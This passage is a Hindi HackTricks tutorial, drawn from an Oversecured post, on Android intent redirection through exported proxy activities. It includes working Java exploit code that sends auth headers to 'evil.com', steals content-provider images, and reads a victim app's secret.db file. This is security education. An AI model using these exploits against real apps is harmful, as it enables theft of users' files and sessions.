<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

- рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!

- рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)

- рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)

- **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **Twitter** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**

- **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ, [hacktricks repo](https://github.com/carlospolop/hacktricks) рдФрд░ [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PR рдЬрдорд╛ рдХрд░рдХреЗред**

</details>


**рдпрд╣рд╛рдВ рд╕реЗ рд▓рд┐рдпрд╛ рдЧрдпрд╛ рдЕрдиреБрд╕рдВрдзрд╛рди** [**https://blog.oversecured.com/Android-Access-to-app-protected-components/**](https://blog.oversecured.com/Android-Access-to-app-protected-components/)

# рдкрд░рд┐рдЪрдп

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХреЗ рд╡реЗрдм рдореЗрдВ **рдУрдкрди рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ** рдХреА рддрд░рд╣ рд╣реЛрддреА рд╣реИред рдХреНрдпреЛрдВрдХрд┐ `Intent` рдХрдХреНрд╖рд╛ `Parcelable` рд╣реЛрддреА рд╣реИ, рдЗрд╕ рдХрдХреНрд╖рд╛ рдХреЗ **рдСрдмреНрдЬреЗрдХреНрдЯ** рдХреЛ рдПрдХ рдЕрдиреНрдп `Intent` рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ **рдЕрддрд┐рд░рд┐рдХреНрдд рдбреЗрдЯрд╛** рдХреЗ рд░реВрдк рдореЗрдВ **рдкрд╛рд╕** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред \
рдмрд╣реБрдд рд╕реЗ рдбреЗрд╡рд▓рдкрд░реНрд╕ рдЗрд╕ рд╕реБрд╡рд┐рдзрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВ рдФрд░ **рдкреНрд░реЙрдХреНрд╕реА** **рдХрдВрдкреЛрдиреЗрдВрдЯреНрд╕** (рдЧрддрд┐рд╡рд┐рдзрд┐рдпрд╛рдБ, рдмреНрд░реЙрдбрдХрд╛рд╕реНрдЯ рд░рд┐рд╕реАрд╡рд░ рдФрд░ рд╕реЗрд╡рд╛рдПрдВ) рдмрдирд╛рддреЗ рд╣реИрдВ рдЬреЛ **рдПрдХ рдПрдореНрдмреЗрдбреЗрдб Intent рд▓реЗрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдЦрддрд░рдирд╛рдХ рд╡рд┐рдзрд┐рдпреЛрдВ рдореЗрдВ рдкрд╛рд╕ рдХрд░рддреЗ рд╣реИрдВ** рдЬреИрд╕реЗ рдХрд┐ `startActivity(...)`, `sendBroadcast(...)` рдЖрджрд┐ред \
рдпрд╣ рдЦрддрд░рдирд╛рдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдРрдк рдХреЛ рдРрд╕реЗ рдЕрдиреНрдп рдРрдк рд╕реЗ рд╕реАрдзреЗ рд▓реЙрдиреНрдЪ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрдиреЗ рд╡рд╛рд▓реЗ рдЧреИрд░-рдирд┐рд░реНрдпрд╛рддрд┐рдд рдХрдВрдкреЛрдиреЗрдВрдЯ рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**, рдпрд╛ рдЙрд╕реЗ рдЕрдкрдиреЗ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рджрд╛рддрд╛рдУрдВ рддрдХ рдкрд╣реБрдВрдЪ рджреЗ рд╕рдХрддрд╛ рд╣реИред **`WebView`** рднреА рдХрднреА-рдХрднреА **рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕реЗ `Intent`** рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ **URL рдХреЛ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ**, `Intent.parseUri(...)` рд╡рд┐рдзрд┐ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рдФрд░ рдЗрд╕реЗ `startActivity(...)` рдХреЛ рдкрд╛рд╕ рдХрд░рддрд╛ рд╣реИред

{% hint style="info" %}
рд╕рд╛рд░рд╛рдВрд╢ рдХреЗ рд░реВрдк рдореЗрдВ: рдпрджрд┐ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдПрдХ рдРрд╕рд╛ Intent рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ рдЬреЛ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЙрд╕реЗ рд╕рдВрднрд╛рд╡рд┐рдд рд░реВрдк рд╕реЗ рдирд┐рд░реНрдпрд╛рддрд┐рдд рдХрдВрдкреЛрдиреЗрдВрдЯреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдорд┐рд▓ рд╕рдХрддреА рд╣реИ рдФрд░ рдЙрдирдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

# рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдорд╛рдорд▓рд╛

рдЪрд▓реЛ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдХреА рдЬрд╛рдВрдЪ рдХрд░рддреЗ рд╣реИрдВред `AndroidManifest.xml` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЯреБрдХрдбрд╝рд╛
```markup
<activity android:name=".ProxyActivity" android:exported="true" />
<activity android:name=".AuthWebViewActivity" android:exported="false" />
```
рдЧрддрд┐рд╡рд┐рдзрд┐ `ProxyActivity`
```java
startActivity((Intent) getIntent().getParcelableExtra("extra_intent"));
```
рдЧрддрд┐рд╡рд┐рдзрд┐ `AuthWebViewActivity`
```java
webView.loadUrl(getIntent().getStringExtra("url"), getAuthHeaders());
```
`AuthWebViewActivity` рдПрдХ рдЙрджрд╛рд╣рд░рдг рд╣реИ **рдЫрд┐рдкреА рд╣реБрдИ рдРрдк рдХреА рдХрд╛рд░реНрдпрд╛рдиреНрд╡рдпрди рдХреНрд╖рдорддрд╛ рдХреА рдЬреЛ рдХреБрдЫ рдЕрд╕реБрд░рдХреНрд╖рд┐рдд рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░рддреА рд╣реИ**, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╕рддреНрд░ рдХреЛ `url` рдкреИрд░рд╛рдореАрдЯрд░ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдП рдЧрдП URL рдкрд░ рдкрд╛рд╕ рдХрд░рдирд╛ред

рдирд┐рд░реНрдпрд╛рдд рдкреНрд░рддрд┐рдмрдВрдз рдХреЗ рдХрд╛рд░рдг **рд╣рдорд▓рд╛рд╡рд░ `AuthWebViewActivity` рддрдХ рд╕реАрдзреЗ рдкрд╣реБрдВрдЪ рдирд╣реАрдВ рдкрд╛ рд╕рдХрддрд╛**ред рдПрдХ рд╕реАрдзреА рдХреЙрд▓
```java
Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.AuthWebViewActivity");
intent.putExtra("url", "http://evil.com/");
startActivity(intent);
```
рдПрдХ `java.lang.SecurityException` рдлреЗрдВрдХрддрд╛ рд╣реИ, `Permission Denial` рдХреЗ рдХрд╛рд░рдг: `AuthWebViewActivity` uid 1337 рд╕реЗ рдирд┐рд░реНрдпрд╛рдд рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ред

рд▓реЗрдХрд┐рди рд╣рдорд▓рд╛рд╡рд░ рд╡рд┐рдХреНрдЯрд┐рдо рдХреЛ рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддрд╛ рд╣реИ `AuthWebViewActivity` рдЦреБрдж рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```java
Intent extra = new Intent();
extra.setClassName("com.victim", "com.victim.AuthWebViewActivity");
extra.putExtra("url", "http://evil.com/");

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
рдФрд░ рдХреЛрдИ рд╕реБрд░рдХреНрд╖рд╛ рдЙрд▓реНрд▓рдВрдШрди рдЙрддреНрдкрдиреНрди рдирд╣реАрдВ рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдЙрд╕ рдРрдк рдХреЗ рдкрд╛рд╕ рдЬреЛ рд╣рдорд▓реЗ рдХреЗ рддрд╣рдд рд╣реИ, рд╡рд╣ рдЕрдкрдиреЗ рд╕рднреА рдШрдЯрдХреЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рд░рдЦрддрд╛ рд╣реИред рдЗрд╕ рдХреЛрдб рдЯреБрдХрдбрд╝реЗ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд▓рд╛рд╡рд╛рд░ рдЕрдкреНрдк рдХреЛ рдПрдВрдбреНрд░реЙрдЗрдб рд╕рд┐рд╕реНрдЯрдо рдХреА рдирд┐рд░реНрдорд┐рдд рдкреНрд░рддрд┐рдмрдВрдзреЛрдВ рдХреЛ рджреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

# рдкреНрд░рднрд╛рд╡ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░

рдЗрд╕ рджреБрд░реНрдмрд▓рддрд╛ рдХреЗ рдкреНрд░рднрд╛рд╡ рдХреЛ рд╡рд┐рд╕реНрддрд╛рд░рд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдкрдХреЛ **рдРрд╕реА рдЕрдиреНрдп рджреБрд░реНрдмрд▓рддрд╛рдУрдВ / рдЧрд▓рддрд┐рдпреЛрдВ рдХрд╛ рдкрддрд╛ рд▓рдЧрд╛рдирд╛ рд╣реЛрдЧрд╛ рдЬреЛ рджреБрд░реНрдмрд▓рддрд╛ рдХреЗ рдкреНрд░рднрд╛рд╡ рдХреЛ рдмрдврд╝рд╛ рд╕рдХрддреА рд╣реИрдВ** (рдХреНрдпреЛрдВрдХрд┐ рджреБрд░реНрдмрд▓рддрд╛ рдЕрдкрдиреЗ рдЖрдк рдореЗрдВ рдХреЛрдИ рдЬреЛрдЦрд┐рдо рдирд╣реАрдВ рдмрдирд╛ рд░рд╣реА рд╣реИ)ред

## рд╕рд╛рдордЧреНрд░реА рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рд╣рдорд▓реЛрдВ рдХрд╛ рд╡рд┐рд╕реНрддрд╛рд░

рдореВрд▓ рдРрдк рдХреЗ рд╡рд┐рд╖рдорддрд╛рдУрдВ рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рд╣рдорд▓рд╛рд╡рд░ рд╡реНрдпрдХреНрддрд┐ рдХреЛ рд╡рд┐рд╖рдорддрд╛рдУрдВ рдХреЗ рд╕рд╛рдордЧреНрд░реА рдкреНрд░рджрд╛рддрд╛рдУрдВ рдХреЗ рдкрд╣реБрдВрдЪ рдХреЛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ** рдЬреЛ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╢рд░реНрддреЛрдВ рдХреЛ рдкреВрд░рд╛ рдХрд░рддреЗ рд╣реИрдВ:

* рдпрд╣ **рдирд┐рд░реНрдпрд╛рдд рдирд╣реАрдВ рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП** (рдЕрдиреНрдпрдерд╛ рдЗрд╕реЗ **рдмрд┐рдирд╛ рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рдЪрд░реНрдЪрд╛ рдХреА рдЬрд╛ рд░рд╣реА рджреБрд░реНрдмрд▓рддрд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдмрд┐рдирд╛ рд╕реАрдзреЗ рд╣рдорд▓рд╛ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**)
* рдЗрд╕реЗ **`android:grantUriPermissions`** рдлрд╝реНрд▓реИрдЧ рдХреЛ **`true`** рдкрд░ рд╕реЗрдЯ рдХрд┐рдпрд╛ рдЬрд╛рдирд╛ рдЪрд╛рд╣рд┐рдПред
* `android:grantUriPermissions="true"` рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЖрдкрдХрд╛ рдЬрд╛рд╡рд╛ рдХреЛрдб `FLAG_GRANT_READ_URI_PERMISSION` рдФрд░ `FLAG_GRANT_WRITE_URI_PERMISSION` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ **рдЙрд╕ `ContentProvider` рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдХрд┐рд╕реА рднреА `Uri` рдХреЗ рд▓рд┐рдП**ред
* `android:grantUriPermissions="false"` рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдХреЗрд╡рд▓ рдЙрди `Uri` рдорд╛рдиреЛрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ `FLAG_GRANT_READ_URI_PERMISSION` рдФрд░ `FLAG_GRANT_WRITE_URI_PERMISSION` рдХреЗ рд╕рд╛рде рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдЬрд┐рдиреНрд╣реЗрдВ рдмрдЪреНрдЪрд╛ `<grant-uri-permission>` рддрддреНрд╡реЛрдВ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИред

рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдПрдХ рд╕рдВрдмрджреНрдз рдЗрдВрдЯреЗрдВрдЯ рдХреЗ рдкреНрд░рд╛рдкреНрддрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ рдФрд░ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝реНрд▓реИрдЧ рд╕реЗрдЯ рдХрд░рдирд╛ рд╣реЛрдЧрд╛

* `Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION` рдкреНрд░рджрд╛рддрд╛ рдХреЗ рд▓рд┐рдП рд╕реНрдерд╛рдпреА рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЗрд╕ рдлрд╝реНрд▓реИрдЧ рдХреЗ рдмрд┐рдирд╛, рдкрд╣реБрдВрдЪ рдХреЗрд╡рд▓ рдПрдХ рдмрд╛рд░ рд╣реЛрддреА рд╣реИ)
* `Intent.FLAG_GRANT_PREFIX_URI_PERMISSION` рдкреНрд░рд┐рдлрд╝рд┐рдХреНрд╕ рджреНрд╡рд╛рд░рд╛ URI рдкрд╣реБрдВрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ - рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдПрдХ рдкреВрд░реНрдг рдкрде рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрд▓рдЧ-рдЕрд▓рдЧ рдкрд╣реБрдВрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдмрдЬрд╛рдп `content://com.victim.provider/image/1` рдЬреИрд╕реЗ рдкреВрд░реНрдг рдкрде рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╣рдорд▓рд╛рд╡рд░ рд╕рднреА рдкреНрд░рджрд╛рддрд╛ рдХреА рд╕рд╛рдордЧреНрд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдлрд┐рд░ `ContentResolver` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ `content://com.victim.provider/image/1`, `content://com.victim.provider/image/2` рдЖрджрд┐ рдХреЛ рдкрддрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
* `Intent.FLAG_GRANT_READ_URI_PERMISSION` рдкреНрд░рджрд╛рддрд╛ рдкрд░ рдкрдврд╝рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ (рдЬреИрд╕реЗ `query`, `openFile`, `openAssetFile` рдЖрджрд┐)
* `Intent.FLAG_GRANT_WRITE_URI_PERMISSION` рд▓рд┐рдЦрдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ

рдПрдХ рдЖрдо рдкреНрд░рджрд╛рддрд╛ рдХрд╛ рдЙрджрд╛рд╣рд░рдг рдЬрд╣рд╛рдВ рд╣рдорд▓рд╛рд╡рд░ рдЗрд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ `query`, `update`, `insert`, `delete`, `openFile`, `openAssetFile` рдЬреИрд╕реЗ рдирд┐рдпрдорд┐рдд рдЖрдкрд░реЗрд╢рди рдХрд░ рд╕рдХрддрд╛ рд╣реИред
```markup
<provider android:name="com.victim.ContentProvider" android:exported="false" android:authorities="com.victim.provider" android:grantUriPermissions="true"/>
```
рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЪрд┐рддреНрд░реЛрдВ рдХреА рдЪреЛрд░реА рдХрд╛ рдЙрджрд╛рд╣рд░рдг `AndroidManifest.xml` рдлрд╝рд╛рдЗрд▓ рдХрд╛ рд╣реИред
```markup
<activity android:name=".LeakActivity" android:exported="true" />
```
`MainActivity.java` рдлрд╝рд╛рдЗрд▓
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION
| Intent.FLAG_GRANT_PREFIX_URI_PERMISSION
| Intent.FLAG_GRANT_READ_URI_PERMISSION
| Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.provider/"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
Uri uri = Uri.parse(getIntent().getDataString() + "image/1")); // content://com.victim.provider/image/1
Bitmap bitmap = BitmapFactory.decodeStream(getContentResolver().openInputStream(uri)); // stolen image
```
## Android рдлрд╝рд╛рдЗрд▓ рдкреНрд░рджрд╛рддрд╛ рдкрд░ рд╣рдорд▓реЗ

рдпрд╣ рд╕реБрд░рдХреНрд╖рд╛ рдХрдордЬреЛрд░реА рднреА рд╣реИ рдЬреЛ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ рдпрд╣ рд╕рдВрднрд╡ рдмрдирд╛рддреА рд╣реИ рдХрд┐ рд╡рд╣ **рдРрдк рдлрд╝рд╛рдЗрд▓реЗрдВ рдЪреБрд░рд╛ рд▓реЗ** рдЬреЛ рдбреЗрд╡рд▓рдкрд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛рдУрдВ рдореЗрдВ рд╕реНрдерд┐рдд рд╣реЛрддреА рд╣реИрдВред рд╕рдлрд▓ рд╣рдорд▓реЗ рдХреЗ рд▓рд┐рдП, рджреБрд╖реНрдЯ рдРрдк рдХреЛ Android рдлрд╝рд╛рдЗрд▓ рдкреНрд░рджрд╛рддрд╛ рдХреЗ рдПрдХреНрд╕реЗрд╕ рдЕрдзрд┐рдХрд╛рд░ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ рдФрд░ рдлрд┐рд░ Android ContentResolver рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдлрд╝рд╛рдЗрд▓ рдкреНрд░рджрд╛рддрд╛ рд╕реЗ рд╕рд╛рдордЧреНрд░реА рдкрдврд╝рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдлрд╝рд╛рдЗрд▓ рдкреНрд░рджрд╛рддрд╛ (рдЕрдзрд┐рдХ рд╡рд┐рд╡рд░рдг рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВ [https://developer.android.com/reference/android/support/v4/content/FileProvider](https://developer.android.com/reference/android/support/v4/content/FileProvider))
```markup
<provider android:name="androidx.core.content.FileProvider" android:exported="false" android:authorities="com.victim.files_provider" android:grantUriPermissions="true">
<meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/provider_paths"/>
</provider>
```
рдпрд╣ рдРрдк рд╕рдВрд╕рд╛рдзрдиреЛрдВ рдореЗрдВ рдкрд╛рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реА рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╕реВрдЪреА рдореЗрдВ рд╕реНрдерд┐рдд рдлрд╝рд╛рдЗрд▓реЛрдВ рдХреЗ рд▓рд┐рдП рдкрдврд╝рдиреЗ/рд▓рд┐рдЦрдиреЗ рдХрд╛ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ, рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ `res/xml/provider_paths.xml` рдкрд░ рдкрд╛рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред

рдпрд╣ рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддрд╛ рд╣реИ
```markup
<?xml version="1.0" encoding="utf-8"?>
<paths>
<root-path name="root" path=""/>
<files-path name="internal_files" path="."/>
<cache-path name="cache" path=""/>
<external-path name="external_files" path="images"/>
</paths>
```
рдкреНрд░рддреНрдпреЗрдХ рдЯреИрдЧ рдПрдХ рд░реВрдЯ рдирд┐рд░реНрджреЗрд╢рд┐рдХрд╛ рдХреЛ рдПрдХ `path` рдорд╛рди рдХреЗ рд╕рд╛рде рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рд░реВрдЯ рдХреЗ рд╕рдВрдмрдВрдз рдореЗрдВ рд╣реЛрддрд╛ рд╣реИред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдорд╛рди `external_files` рдХреЛ `new File(Environment.getExternalStorageDirectory(), "images")` рд╕реЗ рд╕рдВрдмрдВрдзрд┐рдд рд╣реЛрдЧрд╛ред

рдорд╛рди `root-path` рдХреЛ `/` рдХреЗ рд╕рдорд╛рди рд╣реЛрддрд╛ рд╣реИ, рдЕрд░реНрдерд╛рддреН рдпрд╣ рд╡рд┐рдЪрд╛рд░рд╣рд░реВ рдлрд╝рд╛рдЗрд▓реЛрдВ рддрдХ рдкрд╣реБрдВрдЪ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

рдЪрд▓реЛ рдорд╛рди рд▓реЛ рдХрд┐ рд╣рдорд╛рд░реЗ рдкрд╛рд╕ рдлрд╝рд╛рдЗрд▓ `/data/data/com.victim/databases/secret.db` рдореЗрдВ рдХреБрдЫ рдЧреБрдкреНрдд рдбреЗрдЯрд╛ рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ: рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдХреА рдЪреЛрд░реА рдХреБрдЫ рдЗрд╕ рддрд░рд╣ рджрд┐рдЦ рд╕рдХрддреА рд╣реИ `MainActivity.java`
```java
Intent extra = new Intent();
extra.setFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
extra.setClassName(getPackageName(), "com.attacker.LeakActivity");
extra.setData(Uri.parse("content://com.victim.files_provider/root/data/data/com.victim/databases/secret.db"));

Intent intent = new Intent();
intent.setClassName("com.victim", "com.victim.ProxyActivity");
intent.putExtra("extra_intent", extra);
startActivity(intent);
```
`LeakActivity.java`
```java
InputStream i = getContentResolver().openInputStream(getIntent().getData()); // we can now do whatever we like with this stream, e.g. send it to a remote server
```
## WebView рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЕрдирд┐рдпрдорд┐рдд рдХреЙрдореНрдкреЛрдиреЗрдВрдЯреНрд╕ рддрдХ рдкрд╣реБрдВрдЪ

рдПрдХ Intent рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ `Intent.toUri(flags)` рдХреЗ рджреНрд╡рд╛рд░рд╛ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдХрд╛рд╕реНрдЯ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╕реЗ рдПрдХ Intent рдореЗрдВ рд╡рд╛рдкрд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ `Intent.parseUri(stringUri, flags)` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗред рдпрд╣ рдлрдВрдХреНрд╢рдирд╛рд▓рд┐рдЯреА рдЕрдХреНрд╕рд░ WebView (рдРрдк рдХреЗ рдЕрдВрджрд░ рдмрдиреЗ рдмреНрд░рд╛рдЙрдЬрд╝рд░) рдореЗрдВ рдЙрдкрдпреЛрдЧ рдХреА рдЬрд╛рддреА рд╣реИ: **рдРрдк `intent://` рд╕реНрдХреАрдо рдХреЛ рд╕рддреНрдпрд╛рдкрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ, URL рдХреЛ Intent рдореЗрдВ рдкрд╛рд░реНрд╕ рдХрд░ рд╕рдХрддрд╛ рд╣реИ рдФрд░ рдПрдХреНрдЯрд┐рд╡рд┐рдЯреА рдХреЛ рд▓реЙрдиреНрдЪ рдХрд░ рд╕рдХрддрд╛ рд╣реИ**ред

